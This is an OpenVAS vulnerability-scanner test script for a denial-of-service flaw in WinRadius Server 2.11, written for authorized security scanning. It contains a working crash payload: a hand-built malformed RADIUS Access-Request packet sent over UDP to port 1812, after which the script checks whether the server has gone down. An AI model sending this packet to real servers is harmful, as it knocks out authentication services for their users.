###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_winradius_server_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# WinRadius Server Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to cause a denial of
  service.
  Impact Level: Application";

tag_affected = "WinRadius Server version 2.11";
tag_insight = "The flaw is due to an error when parsing Access-Request packets and
  can be exploited to crash the server.";
tag_solution = "No solution or patch is available as of 17th June, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/winradius";
tag_summary = "The host is running WinRadius Server and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(803716);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-12 12:06:46 +0530 (Wed, 12 Jun 2013)");
  script_name("WinRadius Server Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://1337day.com/exploit/20879");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013060100");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121982");
  script_xref(name : "URL" , value : "http://www.iodigitalsec.com/blog/fuzz-to-denial-of-service-winradius-2-11");

  script_description(desc);
  script_summary("Determine if WinRadius Server is prone to denial of service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_dependencies("radius_detect.nasl");
  script_mandatory_keys("Services/udp/radius");
  script_require_ports(1812);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


##
## The script code starts here
##

include("network_func.inc");

port = "";
soc = "";

port = get_kb_item("Services/udp/radius");
if(!port){
  port = 1812;
}

## Check UDP port status as get_udp_port_state() not working properly
if(!check_udp_port_status(dport:port)){
  exit(0);
}

if(!is_radius_alive(port:port)){
  exit(0);
}

soc = open_sock_udp(port);
if (!soc){
  exit(0);
}

req = raw_string(0x01,              ## Code: Access-Request (1)
                 0xff,              ## Packet identifier: 0xff
                 0x00, 0x2c,        ## Length: 44

                 ## Authenticator: D1568A38FBEA4A40B78AA27A8F3EAE23
                 0xd1, 0x56, 0x8a, 0x38, 0xfb, 0xea, 0x4a, 0x40, 0xb7,
                 0x8a, 0xa2, 0x7a, 0x8f, 0x3e, 0xae, 0x23,

                  ## AVP: l=6  t=User-Name(1): 005
                 0x01, 0x06,  0x61, 0x64, 0x61, 0x6d,

                 ## AVP: l=18  t=User-Password(2): Encrypted
                 0x02, 0xff, 0xf0, 0x13, 0x57, 0x7e, 0x48, 0x1e, 0x55,
                 0xaa, 0x7d, 0x29, 0x6d, 0x7a, 0x88, 0x18, 0x89, 0x21);

send(socket:soc, data:req);
close(soc);

if(!is_radius_alive(port:port)){
  security_hole(port:port);
}
